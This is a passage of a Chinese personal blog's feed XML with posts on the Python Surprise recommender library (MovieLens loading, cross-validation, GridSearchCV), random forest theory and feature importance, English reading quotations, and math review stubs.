class="line">from surprise import Dataset</span><br><span class="line"></span><br><span class="line"># Load the movielens-100k dataset</span><br><span class="line">data = Dataset.load_builtin(&apos;ml-100k&apos;)</span><br><span class="line"></span><br><span class="line"># Retrieve the trainset.</span><br><span class="line"># 检索训练集</span><br><span class="line">trainset = data.build_full_trainset()</span><br><span class="line"></span><br><span class="line"># Build an algorithm, and train it.</span><br><span class="line"># 构建算法并训练</span><br><span class="line">algo = KNNBasic()</span><br><span class="line">algo.fit(trainset)</span><br><span class="line"></span><br><span class="line">uid = str(196)  # raw user id (as in the ratings file). They are **strings**!</span><br><span class="line">iid = str(302)  # raw item id (as in the ratings file). They are **strings**!</span><br><span class="line"></span><br><span class="line"># get a prediction for specific users and items.</span><br><span class="line"># ＃获取特定用户和项目的预测。</span><br><span class="line">pred = algo.predict(uid, iid, r_ui=4, verbose=True)</span><br></pre>      </td>    </tr>  </table></figure><p>预测结果：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">user: 196        item: 302        r_ui = 4.00   est = 4.06   &#123;&apos;actual_k&apos;: 40, &apos;was_impossible&apos;: False&#125;</span><br><span class="line"># est表示预测值</span><br></pre>      </td>    </tr>  </table></figure><p> 以上都是使用内置的数据集。</p><p>2、使用自定义数据集</p><p>Surprise有一组内置  数据集，但您当然可以使用自定义数据集。加载评级数据集可以从文件（例如csv文件）或从pandas数据帧完成。无论哪种方式，您都需要Reader为Surprise定义一个对象，以便能够解析文件或数据帧。<br>复制代码</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre>      </td>      <td class="code">        <pre><span class="line"># 要从文件（例如csv文件）加载数据集，您将需要以下 load_from_file()方法：</span><br><span class="line"></span><br><span class="line">from surprise import BaselineOnly</span><br><span class="line">from surprise import Dataset</span><br><span class="line">from surprise import Reader</span><br><span class="line">from surprise.model_selection import cross_validate</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"># path to dataset file</span><br><span class="line"># 数据集路径</span><br><span class="line">file_path = os.path.expanduser(r&apos;C:/Users/FELIX/.surprise_data/ml-100k/ml-100k/u.data&apos;)</span><br><span class="line"></span><br><span class="line"># As we&apos;re loading a custom dataset, we need to define a reader. In the</span><br><span class="line"># movielens-100k dataset, each line has the following format:</span><br><span class="line"># &apos;user item rating timestamp&apos;, separated by &apos;\t&apos; characters.</span><br><span class="line"># ＃当我们加载自定义数据集时，我们需要定义一个reader。在</span><br><span class="line"># ＃movielens-100k数据集中，每一行都具有以下格式：</span><br><span class="line"># ＃&apos;user item rating timestamp&apos;，以&apos;\ t&apos;字符分隔。</span><br><span class="line">reader = Reader(line_format=&apos;user item rating timestamp&apos;, sep=&apos;\t&apos;)</span><br><span class="line"></span><br><span class="line">data = Dataset.load_from_file(file_path, reader=reader)</span><br><span class="line"></span><br><span class="line"># We can now use this dataset as we please, e.g. calling cross_validate</span><br><span class="line"># ＃我们现在可以随意使用这个数据集，例如调用cross_validate</span><br><span class="line">cross_validate(BaselineOnly(), data, verbose=True)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 要从pandas数据框加载数据集，您将需要该 load_from_df()方法。您还需要一个Reader对象，但只能rating_scale指定参数。数据框必须有三列，对应于用户（原始）ID，项目（原始）ID以及此顺序中的评级。因此，每行对应于给定的评级。这不是限制性的，因为您可以轻松地重新排序数据框的列</span><br><span class="line"></span><br><span class="line">import pandas as pd</span><br><span class="line"></span><br><span class="line">from surprise import NormalPredictor</span><br><span class="line">from surprise import Dataset</span><br><span class="line">from surprise import Reader</span><br><span class="line">from surprise.model_selection import cross_validate</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Creation of the dataframe. Column names are irrelevant.</span><br><span class="line"># ＃创建数据帧。列名无关紧要。</span><br><span class="line">ratings_dict = &#123;&apos;itemID&apos;: [1, 1, 1, 2, 2],</span><br><span class="line">                &apos;userID&apos;: [9, 32, 2, 45, &apos;user_foo&apos;],</span><br><span class="line">                &apos;rating&apos;: [3, 2, 4, 3, 1]&#125;</span><br><span class="line">df = pd.DataFrame(ratings_dict)</span><br><span class="line"></span><br><span class="line"># A reader is still needed but only the rating_scale param is requiered.</span><br><span class="line"># ＃仍然需要一个reader，但只需要rating_scale param。</span><br><span class="line">reader = Reader(rating_scale=(1, 5))</span><br><span class="line"></span><br><span class="line"># The columns must correspond to user id, item id and ratings (in that order).</span><br><span class="line"># ＃列必须对应于用户ID，项目ID和评级（按此顺序）。</span><br><span class="line">data = Dataset.load_from_df(df[[&apos;userID&apos;, &apos;itemID&apos;, &apos;rating&apos;]], reader)</span><br><span class="line"></span><br><span class="line"># We can now use this dataset as we please, e.g. calling cross_validate</span><br><span class="line"># ＃我们现在可以随意使用这个数据集，例如调用cross_validate </span><br><span class="line">cross_validate(NormalPredictor(), data, cv=2)</span><br></pre>      </td>    </tr>  </table></figure><p>3、使用交叉验证迭代器</p><p>  对于交叉验证，我们可以使用cross_validate()为我们完成所有艰苦工作的功能。但是为了更好地控制，我们还可以实现交叉验证迭代器，并使用split()迭代器的test()方法和算法的  方法对每个拆分进行预测 。这是一个例子，我们使用经典的K-fold交叉验证程序和3个拆分：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre>      </td>      <td class="code">        <pre><span class="line"></span><br><span class="line">from surprise import SVD</span><br><span class="line">from surprise import Dataset</span><br><span class="line">from surprise import accuracy</span><br><span class="line">from surprise.model_selection import KFold</span><br><span class="line"></span><br><span class="line"># Load the movielens-100k dataset</span><br><span class="line">data = Dataset.load_builtin(&apos;ml-100k&apos;)</span><br><span class="line"></span><br><span class="line"># define a cross-validation iterator</span><br><span class="line"># define一个交叉验证迭代器</span><br><span class="line">kf = KFold(n_splits=3)</span><br><span class="line"></span><br><span class="line">algo = SVD()</span><br><span class="line"></span><br><span class="line">for trainset, testset in kf.split(data):</span><br><span class="line"></span><br><span class="line">    # train and test algorithm.</span><br><span class="line">    #训练和测试算法。</span><br><span class="line">    algo.fit(trainset)</span><br><span class="line">    predictions = algo.test(testset)</span><br><span class="line"></span><br><span class="line">    # Compute and print Root Mean Squared Error</span><br><span class="line">    # 计算并打印输出</span><br><span class="line">    accuracy.rmse(predictions, verbose=True)</span><br></pre>      </td>    </tr>  </table></figure><p>  可以使用其他交叉验证迭代器，如LeaveOneOut或ShuffleSplit。在这里查看所有可用的迭代器。Surprise的交叉验证工具的设计源于优秀的scikit-learn  API。</p><p>交叉验证的一个特例是当折叠已经被某些文件预定义时。例如，movielens-100K数据集已经提供了5个训练和测试文件（u1.base，u1.test …  u5.base，u5.test）。惊喜可以通过使用surprise.model_selection.split.PredefinedKFold  对象来处理这种情况：<br>复制代码</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre>      </td>      <td class="code">        <pre><span class="line">from surprise import SVD</span><br><span class="line">from surprise import Dataset</span><br><span class="line">from surprise import Reader</span><br><span class="line">from surprise import accuracy</span><br><span class="line">from surprise.model_selection import PredefinedKFold</span><br><span class="line"></span><br><span class="line"># path to dataset folder</span><br><span class="line">files_dir = os.path.expanduser(&apos;~/.surprise_data/ml-100k/ml-100k/&apos;)</span><br><span class="line"></span><br><span class="line"># This time, we&apos;ll use the built-in reader.</span><br><span class="line">reader = Reader(&apos;ml-100k&apos;)</span><br><span class="line"></span><br><span class="line"># folds_files is a list of tuples containing file paths:</span><br><span class="line"># [(u1.base, u1.test), (u2.base, u2.test), ... (u5.base, u5.test)]</span><br><span class="line">train_file = files_dir + &apos;u%d.base&apos;</span><br><span class="line">test_file = files_dir + &apos;u%d.test&apos;</span><br><span class="line">folds_files = [(train_file % i, test_file % i) for i in (1, 2, 3, 4, 5)]</span><br><span class="line"></span><br><span class="line">data = Dataset.load_from_folds(folds_files, reader=reader)</span><br><span class="line">pkf = PredefinedKFold()</span><br><span class="line"></span><br><span class="line">algo = SVD()</span><br><span class="line"></span><br><span class="line">for trainset, testset in pkf.split(data):</span><br><span class="line"></span><br><span class="line">    # train and test algorithm.</span><br><span class="line">    algo.fit(trainset)</span><br><span class="line">    predictions = algo.test(testset)</span><br><span class="line"></span><br><span class="line">    # Compute and print Root Mean Squared Error</span><br><span class="line">    accuracy.rmse(predictions, verbose=True)</span><br></pre>      </td>    </tr>  </table></figure><p>当然，也可以对单个文件进行训练和测试。但是folds_files参数仍然要列表的形式。</p><p>4、使用GridSearchCV调整算法参数</p><p>该cross_validate()函数报告针对给定参数集的交叉验证过程的准确度度量。如果你想知道哪个参数组合能产生最好的结果，那么这个  GridSearchCV类就可以解决了。给定一个dict参数，该类详尽地尝试所有参数组合并报告任何精度测量的最佳参数（在不同的分裂上取平均值）。它受到scikit-learn的GridSearchCV的启发。</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre>      </td>      <td class="code">        <pre><span class="line"></span><br><span class="line">from surprise import SVD</span><br><span class="line">from surprise import Dataset</span><br><span class="line">from surprise.model_selection import GridSearchCV</span><br><span class="line"></span><br><span class="line"># Use movielens-100K</span><br><span class="line">data = Dataset.load_builtin(&apos;ml-100k&apos;)</span><br><span class="line"></span><br><span class="line">param_grid = &#123;&apos;n_epochs&apos;: [5, 10], &apos;lr_all&apos;: [0.002, 0.005],</span><br><span class="line">              &apos;reg_all&apos;: [0.4, 0.6]&#125;</span><br><span class="line">gs = GridSearchCV(SVD, param_grid, measures=[&apos;rmse&apos;, &apos;mae&apos;], cv=3)</span><br><span class="line"></span><br><span class="line">gs.fit(data)</span><br><span class="line"></span><br><span class="line"># best RMSE score</span><br><span class="line">print(gs.best_score[&apos;rmse&apos;]) # 输出最高的准确率的值</span><br><span class="line"></span><br><span class="line"># combination of parameters that gave the best RMSE score</span><br><span class="line">print(gs.best_params[&apos;rmse&apos;]) # 输出最好的批次，学习率参数</span><br></pre>      </td>    </tr>  </table></figure><p>通过上面操作得到最佳参数后就可以使用该参数的算法：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line"># We can now use the algorithm that yields the best rmse:</span><br><span class="line">algo = gs.best_estimator[&apos;rmse&apos;]</span><br><span class="line">algo.fit(data.build_full_trainset())</span><br></pre>      </td>    </tr>  </table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;sklearn/surprise&lt;/p&gt;
    
    </summary>
    
      <category term="python" scheme="http://javastar.club/categories/python/"/>
    
    
      <category term="python" scheme="http://javastar.club/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>python机器学习笔记1</title>
    <link href="http://javastar.club/archives/3012948c.html"/>
    <id>http://javastar.club/archives/3012948c.html</id>
    <published>2019-08-08T07:09:03.000Z</published>
    <updated>2019-08-08T09:20:56.944Z</updated>
    
    <content type="html"><![CDATA[<p>推荐系统学习:LensKit</p><a id="more"></a><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>  LensKit是协同过滤算法的一个实现和一组校准它们的工具，开发者是明尼苏达大学的，推荐领域著名的MovieLens也是出自这个大学。详细信息请去LenSkit官方网站或者wiki查阅。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;推荐系统学习:LensKit&lt;/p&gt;
    
    </summary>
    
      <category term="python" scheme="http://javastar.club/categories/python/"/>
    
    
      <category term="python" scheme="http://javastar.club/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>python机器学习笔记</title>
    <link href="http://javastar.club/archives/a80115f8.html"/>
    <id>http://javastar.club/archives/a80115f8.html</id>
    <published>2019-08-08T07:08:46.000Z</published>
    <updated>2019-08-09T01:39:20.573Z</updated>
    
    <content type="html"><![CDATA[<p>随机森林算法，参考：<a href="https://www.cnblogs.com/wj-1314/p/9628303.html" rel="external nofollow noopener noreferrer" target="_blank">https://www.cnblogs.com/wj-1314/p/9628303.html</a></p><a id="more"></a><h3 id="随机森林算法的理论知识"><a href="#随机森林算法的理论知识" class="headerlink" title="随机森林算法的理论知识"></a>随机森林算法的理论知识</h3><p>  　　随机森林是一种有监督学习算法，是以决策树为基学习器的集成学习算法。随机森林非常简单，易于实现，计算开销也很小，但是它在分类和回归上表现出非常惊人的性能，因此，随机森林被誉为“代表集成学习技术水平的方法”。</p><h4 id="一，随机森林的随机性体现在哪几个方面？"><a href="#一，随机森林的随机性体现在哪几个方面？" class="headerlink" title="一，随机森林的随机性体现在哪几个方面？"></a>一，随机森林的随机性体现在哪几个方面？</h4><p><strong>1，数据集的随机选取</strong></p><p>  　　从原始的数据集中采取有放回的抽样（bagging），构造子数据集，子数据集的数据量是和原始数据集相同的。不同子数据集的元素可以重复，同一个子数据集中的元素也可以重复。</p><p><strong>2，待选特征的随机选取</strong></p><p>  　　与数据集的随机选取类似，随机森林中的子树的每一个分裂过程并未用到所有的待选特征，而是从所有的待选特征中随机选取一定的特征，之后再在随机选取的特征中选取最优的特征</p><h4 id="二，为什么使用随机森林？"><a href="#二，为什么使用随机森林？" class="headerlink" title="二，为什么使用随机森林？"></a>二，为什么使用随机森林？</h4><p>1，随机森林既可以用于分类问题，也可以用于回归问题</p><p>2，过拟合是个关键的问题，可能会让模型的结果变得糟糕，但是对于随机森林来说，如果随机森林的树足够多，那么分类器就不会过拟合模型</p><p>3，随机森林分类器可以处理缺失值</p><p>4，随机森林分类器可以用分类值建模</p><h4 id="三，随机森林的构建过程"><a href="#三，随机森林的构建过程" class="headerlink" title="三，随机森林的构建过程"></a>三，随机森林的构建过程</h4><p>1，从原始训练集中使用Bootstraping方法随机有放回采样取出m个样本，共进行n_tree次采样。生成n_tree个训练集</p><p>2，对n_tree个训练集，我们分别训练n_tree个决策树模型</p><p>3，对于单个决策树模型，假设训练样本特征的个数为n，那么每次分裂时根据信息增益/信息增益比/基尼指数 选择最好的特征进行分裂</p><p>4，每棵树都已知这样分裂下去，知道该节点的所有训练样例都属于同一类。在决策树的分裂过程中不需要剪枝</p><p>5，将生成的多颗决策树组成随机森林。对于分类问题，按照多棵树分类器投票决定最终分类结果；对于回归问题，由多颗树预测值的均值决定最终预测结果</p><p>注意：OOB（out-of-bag ）：每棵决策树的生成都需要自助采样，这时就有1/3的数据未被选中，这部分数据就称为袋外数据。<br><img src="https://github.com/starstarb/clouding/raw/master/python/%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97.png" alt></p><h4 id="四，随机森林优缺点总结"><a href="#四，随机森林优缺点总结" class="headerlink" title="四，随机森林优缺点总结"></a>四，随机森林优缺点总结</h4><p><strong>优点</strong></p><ul>  <li>由于采用了集成算法，本身精度比大多数单个算法要好，所以准确性高</li>  <li>在测试集上表现良好，由于两个随机性的引入，使得随机森林不容易陷入过拟合（样本随机，特征随机）</li>  <li>在工业上，由于两个随机性的引入，使得随机森林具有一定的抗噪声能力，对比其他算法具有一定优势</li>  <li>由于树的组合，使得随机森林可以处理非线性数据，本身属于非线性分类（拟合）模型</li>  <li>它能够处理很高维度（feature很多）的数据，并且不用做特征选择，对数据集的适应能力强：既能处理离散型数据，也能处理连续型数据，数据集无需规范化  </li>  <li>训练速度快，可以运用在大规模数据集上</li>  <li>可以处理缺省值（单独作为一类），不用额外处理</li>  <li>由于有袋外数据（OOB），可以在模型生成过程中取得真实误差的无偏估计，且不损失训练数据量</li>  <li>在训练过程中，能够检测到feature间的互相影响，且可以得出feature的重要性，具有一定参考意义</li>  <li>由于每棵树可以独立、同时生成，容易做成并行化方法</li>  <li>由于实现简单、精度高、抗过拟合能力强，当面对非线性数据时，适于作为基准模型</li></ul><p><strong>缺点</strong></p><p>  当随机森林中的决策树个数很多时，训练时需要的空间和时间会比较大<br>随机森林中还有许多不好解释的地方，有点算是黑盒模型<br>在某些噪音比较大的样本集上，RF的模型容易陷入过拟合</p><h4 id="五，特征重要性评估"><a href="#五，特征重要性评估" class="headerlink" title="五，特征重要性评估"></a>五，特征重要性评估</h4><p>  　　现实情况下，一个数据集中往往有成百上千个特征，如何在其中选择比结果影响最大的那几个特征，以此来缩减建立模型时特征数是我们比较关心的问题。这样的方法其实很多，比如主成分分析，lasso等等。不过这里我们学习的是用随机森林来进行特征筛选。</p><p>　　用随机森林进行特征重要性评估的思想就是看每个特征在随机森林中的每棵树上做了多大的贡献，然后取个平均值，最后比一比特征之间的贡献大小。</p><p>　　贡献大小通常使用基尼指数（Gini index）或者袋外数据（OOB）错误率作为评估指标来衡量。这里我们再学习一下基尼指数来评价的方法。</p><p>　　我们将变量重要性评分（variable importance  measures）用VIM来表示，将Gini指数用GI来表示，假设m个特征X1，X2，X3，……Xc，现在要计算出每个特征Xj的Gini指数评分VIMj（Gini）,亦即第j个特征在RF所有决策树中节点分裂不纯度的平均改变量。</p><p>　　Gini指数的计算公式为：<br><img src="https://github.com/starstarb/clouding/raw/master/python/Gini.png" alt><br>其中，K表示有K个类别。Pmk表示节点m中类列k所占的比例。</p><p>　　直观的说，就是随便从节点m中随机抽取两个样本，其类别标记不一致的概率。</p><p>　　特征Xj在节点m的重要性，即节点m分支前后的Gini指数变化量为：<br><img src="https://github.com/starstarb/clouding/raw/master/python/VIM.png" alt><br>其中，GIl和GIr分别表示分枝后两个新节点的Gini指数。</p><p>　　如果，特征Xj在决策树i中出现的节点在集合M中，那么Xj在第i颗树的重要性为：<br><img src="https://github.com/starstarb/clouding/raw/master/python/VIMIT.png" alt><br>假设RF中共有n颗树，那么<br><img src="https://github.com/starstarb/clouding/raw/master/python/VIMij.png" alt><br>　最后，把所有求得的重要性评分做一个归一化处理即可。<br><img src="https://github.com/starstarb/clouding/raw/master/python/VIMsum.png" alt></p><h5 id="5-1-特征选择"><a href="#5-1-特征选择" class="headerlink" title="5.1 特征选择"></a>5.1  特征选择</h5><p><strong>5.1.1 特征选择的步骤</strong></p><p>　　在特征重要性的基础上，特征选择的步骤如下：</p><ul>  <li>计算每个特征的重要性，并按降序排序</li>  <li>确定要剔除的比例，依据特征重要性剔除相应比例的特征，得到一个新的特征集</li>  <li>用新的特征集重复上述过程，直到剩下m个特征（m为提前设定的值）</li>  <li>根据上述代码中得到的各个特征集合特征集对应的袋外误差率，选择袋外误差率最低的特征集</li>  <li><em>5.1.2 特征重要性的估计方法*</em></li></ul><p>  　　特征重要性的估计通常有两种方法：一是使用uniform或者gaussian抽取随机值替换原特征；一是通过permutation的方式将原来的所有N个样本的第i个特征值重新打乱分布，第二种方法更加科学，保证了特征替代值与原特征的分布是近似的。这种方法叫做permutation  test ，即在计算第i个特征的重要性的时候，将N 个特征的第i个特征重新洗牌，然后比较D和表现的差异性，如果差异很大，则表明第i个特征是重要的。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;随机森林算法，参考：&lt;a href=&quot;https://www.cnblogs.com/wj-1314/p/9628303.html&quot; rel=&quot;external nofollow noopener noreferrer&quot; target=&quot;_blank&quot;&gt;https://www.cnblogs.com/wj-1314/p/9628303.html&lt;/a&gt;
&lt;/p&gt;
    
    </summary>
    
      <category term="python" scheme="http://javastar.club/categories/python/"/>
    
    
      <category term="python" scheme="http://javastar.club/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>debug技巧总结</title>
    <link href="http://javastar.club/archives/fe81e267.html"/>
    <id>http://javastar.club/archives/fe81e267.html</id>
    <published>2019-08-08T03:41:29.000Z</published>
    <updated>2019-08-08T03:47:28.241Z</updated>
    
    <content type="html"><![CDATA[]]></content>
    
    <summary type="html">
    
      
      
        

      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>英语阅读</title>
    <link href="http://javastar.club/archives/c20ae70.html"/>
    <id>http://javastar.club/archives/c20ae70.html</id>
    <published>2019-08-08T01:58:16.000Z</published>
    <updated>2019-08-08T06:02:55.702Z</updated>
    
    <content type="html"><![CDATA[<p>Every atom in your body came from a star that exploded.</p><p>And, the atoms in your left hand probably came from a different star than  your right hand.</p><p>It really is the most poetic thing I know about physics.</p><p>You are all stardust.<br> –Lawrence M. Krauss</p><a id="more"></a><ol>  <li>    <p>If I should meet thee<br>After long years,<br>How should I greet      thee?<br>With silence and tears.<br>–Byron</p>  </li>  <li>    <p>Time doth transfix the flourish set on youth<br>And delves the parallels      in beauty’s brow,<br>Feeds one the rarities of nature’s truth,<br>And      nothing stands but for his scythe to mow<br>–Shakespeare’ sonnets</p>  </li>  <li>    <p>Do not fall in love with people like me,<br>I will take you to      museums,and parks, and monuments.</p>    <p>And kiss you in every beautiful place,<br>so that you can never go back      to them</p>    <p>Without tasting me like blood in your mouth.<br>I will destroy you in the      most beautiful way possible.</p>    <p>And when I leave you will finally understand,<br>Why storms are named      after people.<br>–Caitlyn Siehl</p>  </li>  <li>    <p>I will return, find you, love you ,marry you and live<br>without shame.    </p>  </li>  <li>    <p>We are all in the gutter, but some of us are looking<br>at the      stars.<br>– Wilde</p>  </li>  <li>    <p>Sometimes ever, sometimes never.</p>  </li>  <li>    <p>If I could, surely would.</p>  </li>  <li>    <p>May there be enough clouds in you life to make a<br>beautiful sunset.</p>  </li>  <li>    <p>No pains, no gains.</p>  </li>  <li>    <p>Life is like a box of chocolates,you never know what<br>what you are      going to get.</p>  </li>  <li>    <p>You must always have faith in who you are.</p>  </li>  <li>    <p>The longest day has an end.<br>– Howell</p>  </li>  <li>    <p>Do not cry because it is over,smile because it<br>happened.</p>  </li>  <li>    <p>To be,or not to be - that is the question.<br>–hamlet</p>  </li>  <li>    <p>When you feel like hope is gone, look inside you and<br>search your soul,      you will find a hero lies in you mind. Dreams are hard to follow,but don’t      let anyone steal your dream.</p>  </li>  <li>    <p>And forever has no end.</p>  </li>  <li>    <p>Love is a game that two can play and both win.</p>  </li>  <li>    <p>Life has taught us that love does not consist in<br>gazing at each other      but in looking outward together in the same direction.</p>  </li>  <li>    <p>Love alone could waken love!</p>  </li>  <li>    <p>Some of us get dipped in flat, some in satin, some in<br>gloss.<br>But      every once in a while you find someone who’s iridescent, and when you do,      nothing will ever compare.</p>  </li></ol><h3 id="Reading-Comprehension"><a href="#Reading-Comprehension" class="headerlink" title="Reading Comprehension"></a>Reading  Comprehension</h3><p> France,which prides itself as the global innovator of fashion, has decided  its fashion industry has lost an absolute right to define physical beauty for  women.<br> Its lawmakers gave preliminary approval last week to a<br> law that  would make it a crime to employ ultra-thin models on runways.</p><p> The parliament also agreed to ban websites that “incite excessive thinness”  by promoting extreme dieting.</p><p> Such measures have a couple of uplifting motives. They suggest beauty should  not be defined by looks that end<br> up impinging on health. That’s a start.  And the ban on ultra-thin models seems to go beyond protecting models from  starving themselves to death–as some have done.<br> It tells the fashion  industry that it must take responsibility for the signal it sends women,  especially teenage girls, about the social tape-measure they must use to  determine their individual worth.</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Every atom in your body came from a star that exploded.&lt;/p&gt;
&lt;p&gt;And, the atoms in your left hand probably came from a different star than
  your right hand.&lt;/p&gt;
&lt;p&gt;It really is the most poetic thing I know about physics.&lt;/p&gt;
&lt;p&gt;You are all stardust.&lt;br&gt; –Lawrence M. Krauss&lt;/p&gt;
    
    </summary>
    
      <category term="English" scheme="http://javastar.club/categories/English/"/>
    
    
      <category term="English" scheme="http://javastar.club/tags/English/"/>
    
  </entry>
  
  <entry>
    <title>数学基础复习:概率论</title>
    <link href="http://javastar.club/archives/fb566d07.html"/>
    <id>http://javastar.club/archives/fb566d07.html</id>
    <published>2019-08-06T08:32:15.000Z</published>
    <updated>2019-08-07T10:28:33.474Z</updated>
    
    <content type="html"><![CDATA[<p>三大基础数学复习：概率论</p><a id="more"></a>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;三大基础数学复习：概率论&lt;/p&gt;
    
    </summary>
    
      <category term="数学基础" scheme="http://javastar.club/categories/%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="数学基础" scheme="http://javastar.club/tags/%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>数学基础复习</title>
    <link href="http://javastar.club/archives/83ff8e26.html"/>
    <id>http://javastar.club/archives/83ff8e26.html</id>
    <published>2019-08-05T07:00:43.000Z</published>
    <updated>2019-08-07T07:14:52.720Z</updated>
    
    <content type="html"><![CDATA[<p>三大基础数学复习</p><a id="more"></a><h1 id="一、高等数学复习"><a href="#一、高等数学复习" class="headerlink" title="一、高等数学复习"></a>一、高等数学复习</h1><h2 id="高数-上"><a href="#高数-上" class="headerlink" title="高数(上)"></a>高数(上)</h2><h3 id="第一章、函数与极限"><a href="#第一章、函数与极限" class="headerlink" title="第一章、函数与极限"></a>第一章、函数与极限</h3><ol>  <li>函数</li></ol><p><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%87%BD%E6%95%B0%E4%B8%8E%E6%9E%81%E9%99%90/1.%E5%87%BD%E6%95%B0/1%E5%87%BD%E6%95%B0_1.jpg" alt="函数与极限"></p><p><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%87%BD%E6%95%B0%E4%B8%8E%E6%9E%81%E9%99%90/1.%E5%87%BD%E6%95%B0/1%E5%87%BD%E6%95%B0_2.jpg" alt="函数与极限"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%87%BD%E6%95%B0%E4%B8%8E%E6%9E%81%E9%99%90/1.%E5%87%BD%E6%95%B0/1%E5%87%BD%E6%95%B0_3.jpg" alt="测试"></p><ol start="2">  <li>数列极限 </li></ol><p><img 